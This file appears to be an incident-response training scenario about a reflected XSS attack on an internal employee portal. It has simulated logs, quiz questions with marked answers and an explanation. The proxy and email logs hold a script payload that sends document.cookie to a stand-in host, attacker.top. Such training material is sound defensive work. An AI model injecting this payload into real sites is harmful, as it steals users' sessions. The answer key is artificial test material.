scenarios.push({
    id: "ir-scenario-2026-xss-attack",
    title: "Operation Script Trap: Cross-Site Scripting",
    description: "Suspicious script payloads detected in search-query parameters of the internal employee portal, followed by unauthorized session activity.",
    logs: {
        proxy: [
            "2026-05-29T11:00:15Z - IP: 192.168.10.12 - URL: https://portal.company.local/search?q=benefits - Status: 200 - Bytes: 4500",
            "2026-05-29T11:05:40Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=<script>fetch('https://attacker.top/steal?c='+document.cookie)</script> - Status: 200 - Bytes: 4200",
            "2026-05-29T11:08:22Z - IP: 192.168.10.12 - URL: https://portal.company.local/search?q=<script>fetch('https://attacker.top/steal?c='+document.cookie)</script> - Status: 200 - Bytes: 4200",
            "2026-05-29T11:15:00Z - IP: 192.168.10.12 - URL: https://attacker.top/steal?c=sessionid=ABC123XYZ - Status: 200 - Bytes: 45",
            "2026-05-29T11:20:00Z - IP: 203.0.113.10 - URL: https://portal.company.local/admin/user_mgmt - Status: 200 - Cookie: sessionid=ABC123XYZ - Bytes: 12500"
        ],
        email: [
            "2026-05-29T10:55:00Z - Inbound - From: hr-internal@portal-update.com - To: fsmith@company.com - Subject: Action Required: Review New Benefits Search Feature - Link: https://portal.company.local/search?q=<script>...</script> - Status: Delivered"
        ],
        file_server: [
            "2026-05-29T11:22:00Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 203.0.113.10 - User: COMPANY\\fsmith (via Web Session)"
        ],
        workstations: [
            "2026-05-29T11:08:22Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: chrome.exe spawned - URL: https://portal.company.local/search?q=..."
        ],
        auth_logs: [
            "2026-05-29T11:20:00Z - Web_Auth - User: fsmith@company.com - App: Employee Portal - Status: Success - Source: 203.0.113.10 - Note: Session Token Reuse Detected"
        ]
    },
    questions: {
        vector: {
            label: "What type of vulnerability was exploited to steal the user's session?",
            type: "select",
            options: [
                "Reflected Cross-Site Scripting (XSS)",
                "Stored Cross-Site Scripting (XSS)",
                "SQL Injection in the search bar",
                "Phishing for plaintext credentials"
            ],
            correct: "Reflected Cross-Site Scripting (XSS)"
        },
        delivery: {
            label: "How was the malicious script payload delivered to the victim?",
            type: "select",
            options: [
                "Embedded in a phishing email link",
                "Uploaded as a malicious profile picture",
                "Through a compromised third-party browser extension",
                "Directly injected into the web server's database"
            ],
            correct: "Embedded in a phishing email link"
        },
        indicator: {
            label: "What log entry confirms that the session theft was successful?",
            type: "select",
            options: [
                "A 500 error on the search page",
                "A 200 OK response for a request to attacker.top containing a session cookie",
                "The creation of a new user account on WKSTN-02",
                "An oversized ICMP ping from the employee portal"
            ],
            correct: "A 200 OK response for a request to attacker.top containing a session cookie"
        }
    },
    principles: ["Cross-Site Scripting (XSS)", "Phishing / Social Engineering", "Unauthorized Privilege Use"],
    explanation: "The incident began with a phishing email sent to user 'fsmith'. The email contained a link to the internal employee portal with a malicious JavaScript payload reflected in the 'q' search parameter. When fsmith clicked the link at 11:08:22Z, the script executed in their browser, fetching their session cookie and sending it to the attacker's external domain 'attacker.top'. The attacker then immediately used this stolen session token at 11:20:00Z from an external IP (203.0.113.10) to access the administrative areas of the portal and HR files. This is a classic Reflected XSS attack combined with Session Hijacking."
});
